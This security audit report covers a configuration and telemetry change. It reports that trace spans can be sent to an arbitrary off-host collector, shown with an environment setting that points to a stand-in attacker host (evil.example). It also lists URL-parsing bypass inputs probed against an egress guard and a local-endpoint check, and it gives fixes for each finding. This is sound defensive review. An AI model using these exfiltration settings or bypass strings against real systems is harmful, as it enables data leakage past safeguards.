# Security audit: platform-config (2026-10-18)

- Scope: `git diff 40c0c75` (uncommitted, branch `agent/platform-config`) plus untracked `engine/`, `config/`, `.env.example`, `tests/test_engine_*.py`, `tests/engine_support.py`, `tests/hardcoded_scan.py`.
- Method: code read, plus unit-level probes in the `gates` image (`network_mode: none`, only `lo` present). Probe script: `docs/evidence/platform-config/security-probe.py`. Raw output: `docs/evidence/platform-config/security-probes.txt` (sections 1-7 cited below as P1..P7).
- **Verdict: FAIL.** 1 high (H1), 2 medium, 7 low/info.

## High (merge-blocking)

### H1. Non-local trace export bypasses the PS-1.5 refusal through `tracing=console`
- `engine/telemetry.py:50-52`: for `tracing == "console"`, `configure_tracing` calls `harness_telemetry.setup_tracing()`. That function ignores the settings and reads `HARNESS_TRACING` (default `otlp`) and `PHOENIX_COLLECTOR_ENDPOINT` straight from `os.environ` (`harness_telemetry/tracing.py:49-67`).
- `engine/startup.py:74` checks the collector only when `telemetry.tracing == "otlp"`, so it never sees the endpoint in console mode.
- Repro (P7), with `KE_ENV=ci`:
  - `KE_TELEMETRY__TRACING=console`, `PHOENIX_COLLECTOR_ENDPOINT=http://evil.example:4318`, `HARNESS_TRACING` unset: `check()` passes, `configure_tracing` returns True, and an `OTLPSpanExporter` is installed to `http://evil.example:4318/v1/traces`.
  - The same happens with `KE_TELEMETRY__COLLECTOR_ENDPOINT=http://localhost:6006` (settings look local) plus `HARNESS_TRACING=otlp` and an external `PHOENIX_COLLECTOR_ENDPOINT`.
- Impact:
  - The operator asked for console output, and spans silently go to an arbitrary off-host collector. No refusal, no warning.
  - This defeats DR39 / PS-1.5 "trace export to a collector that is not local" and the Q3 local-only ruling.
  - Outside dev, the hide flags redact input/output values only. Span names, `ke.*` attributes, exception messages and stack traces still leave the host. In dev, with the hide flags off, prompts and documents leave too.
- Root cause: two configuration readers for one decision. The settings decide the mode; harness env vars pick the exporter.
- Fix (developer):
  - In the console branch, install the exporter from the settings, e.g. `setup_tracing(PROJECT_NAME, exporter=ConsoleSpanExporter())`, or build the provider locally as the otlp branch does. Never let harness env pick an exporter for the engine.
  - Add a fast test: `KE_TELEMETRY__TRACING=console`, external `PHOENIX_COLLECTOR_ENDPOINT`, `HARNESS_TRACING` unset or `otlp`, so no OTLP exporter is attached. Add a DR38 mutant for it.
  - Related (part of the same fix): when a `TracerProvider` already exists, `configure_tracing` returns False without checking where it exports (`telemetry.py:40`). Either refuse, or record that the existing exporter was not verified.

## Medium (non-blocking)

### M1. `.env` is not git-ignored
- `.env.example:1` says "Copy to .env" and the real secrets go there.
- `.gitignore` has no `.env` entry: `git check-ignore .env` exits 1. `.dockerignore` does exclude `.env*`.
- One `git add -A` commits the real database passwords.
- Fix: add `.env` and `.env.*` with `!.env.example` to `.gitignore`, plus a fast test.

### M2. Phoenix is published on all host interfaces
- `docker-compose.yml`: `"${KE_PHOENIX_PORT:-47101}:${PHOENIX_PORT:-6006}"` binds `0.0.0.0`.
- Phoenix has no auth by default. Anyone on the LAN can read traces and post OTLP spans.
- This is pre-existing (it was `6006:6006`), but the line was rewritten in this diff. Dropping 4317 is an improvement.
- Fix: `"127.0.0.1:${KE_PHOENIX_PORT:-47101}:..."`, or confirm that the platform-stack gateway (ADR-KE-011) replaces this publish.

## Low / info (non-blocking)

- **L1. The placeholder check can be bypassed by a leading invisible character** (`startup.py:89`, P6).
  - Values with a leading space, tab or zero-width space (U+200B) before `changeme` all start in `ci`.
  - Weak values (a single space, `x`) are accepted too.
  - Fix: `.strip()` (and strip U+200B) before the prefix test. Consider a minimum length outside dev.
- **L2. The allowlist matches the host only.**
  - Any port and scheme on an allowed host passes (`allowed.example:1`, `:65535`).
  - `allowed.example..` normalises onto the allowlist entry.
  - Matches ADR-KE-010 as written. Record it, or add an optional `host:port` form.
- **L3. Nothing forces outbound HTTP through `ModelClient`** (P4).
  - A plain `httpx.Client()` reaches `create_connection("evil.example", 80)`.
  - Today no other client exists (grep is clean). Until the platform-stack internal network lands, the guard is opt-in.
  - Suggest a fast scan test: no `httpx.Client`, `AsyncClient`, `requests` or `urllib.request` outside `engine/llm/client.py`.
- **L4. Some exceptions escape the `ConfigError`/`StartupRefused` contract** (P6).
  - A non-JSON `KE_STACK__SERVICE_NAMES` raises `pydantic_settings.SettingsError`, which neither `Settings.__init__` nor the `except ConfigError` in `configure_tracing` catches.
  - `KE_MODEL_UPSTREAM="[::1"` raises `ValueError: Invalid IPv6 URL` from `host_of`.
  - Both fail closed and carry no value. Wrap them.
- **L5. The definition of "local" can be widened by env** (P5, P6).
  - `KE_STACK__SERVICE_NAMES=["evil.example"]` makes `http://evil.example` "local", and startup passes with `tracing=otlp`.
  - Bare service names resolve through resolv.conf search domains when the engine runs outside compose.
  - `phoenix.` and `api.` are accepted.
  - Whoever sets the env is trusted, but the safety net is weaker than PS-1.5 implies. Suggest: refuse dotted names in `service_names`, or do not allow env overrides of it.
- **L6. `configure_tracing` mutates `os.environ`** (`telemetry.py:32-33`).
  - The change is process-global, inherited by child processes, and overrides operator-set `OPENINFERENCE_HIDE_*` values.
  - It runs before `check()`, so outside dev with hide=false, startup spans are exported (locally) before the refusal. They carry no input/output values, so nothing leaks today.
  - Prefer passing the flags to harness explicitly.
- **L7. A YAML parse error is chained (`loader.py:92`, `from exc`).**
  - The traceback shows a snippet of the file. If `KE_CONFIG_FILE` points at a sensitive file, that snippet is printed.
  - Suggest `from None` (as `Settings.__init__` already does).

## Passed checks
- **Egress guard:**
  - userinfo (`allowed@evil`, `allowed:pw@evil`), fragment-`@` and query-`@` all deny `evil.example`.
  - A backslash before `@` is percent-encoded into userinfo, and httpx dials `allowed.example`, the host the guard checked. Guard and socket use one parsed URL.
  - Case and a trailing dot are matched.
  - Decimal, hex and short IPv4 forms are denied (octal forms are rejected by httpx).
  - IPv6 and `::ffff:` forms are denied; an IDN homoglyph is punycoded and denied.
  - Every redirect hop is checked (P1, P2).
  - Denied requests make zero `getaddrinfo`/`connect`/`create_connection` calls (P3).
  - With `HTTP(S)_PROXY`, `ALL_PROXY`, `NO_PROXY=*` and lowercase `http_proxy` set, `ModelClient` has `trust_env=False` and no mounts, and an allowed host is dialled directly.
  - DNS answers for an allowed name are trusted by design (the gateway is the dial target per ADR-KE-011).
- **is_local_endpoint:**
  - These are refused: `localhost.evil.com`, `127.0.0.1.nip.io`, `0.0.0.0`, `[::]`, `phoenix.evil.com`, `phoenix-evil`, `localhost@evil.com`, backslash-`@` forms, `localhost:6006@evil.com`, and `%2e` tricks.
  - `[::ffff:127.0.0.1]` is accepted, and it is loopback.
  - `str(AnyHttpUrl)` normalisation means the checker and the exporter see the same host.
- **Startup refusals:**
  - Auth: `false/False/FALSE/0/off/no/f/n` are refused outside dev. Values with whitespace are a ConfigError (fail closed). An empty value falls back to the default `true`.
  - `KE_ENV` is case-sensitive: `DEV`, a value with a leading space, and `development` give a ConfigError, and an empty value means `prod`.
  - Hide flags: same results as auth, through both `KE_` and `OPENINFERENCE_*` names.
  - Placeholder `changeme`: matched case-insensitively.
  - Startup refusals for model upstream and base_url catch the userinfo tricks.
- **Secrets:**
  - Errors name keys and never values (`include_input=False`, `from None`).
  - `ke.overridden_env` lists names only, and no secret reaches a span attribute.
  - `SecretStr` repr is masked.
  - `.env.example` holds only `changeme-stores-*-password` placeholders, and `defaults.yaml` holds no secrets.
  - The scan over the diff, the new files and every `docs/evidence/platform-config/*` file found no keys, tokens, private keys, connection strings, profile paths (plain or JSON-escaped) or e-mail. The hits were only `SecretStr` annotations, test names and the test constant `SAFE_SECRET`.
- **YAML:** only `yaml.safe_load`. No `yaml.load`, pickle, eval or subprocess in the new code.
- **Dependencies:**
  - Every new package is locked from `pypi.org/simple` with sha256 hashes: httpx 0.28.1, httpcore 1.0.9, h11 0.16.0 (the CVE-2025-43859 fix), anyio, idna, certifi, pydantic 2.14.1/core 2.50.1, pydantic-settings 2.16.0, python-dotenv 1.2.4, PyYAML 6.0.3, coverage, mypy, types-pyyaml.
  - The only other source is the editable project. No online advisory scan was run (the gates have no network and pip-audit is not installed). I know of no advisory against these versions.
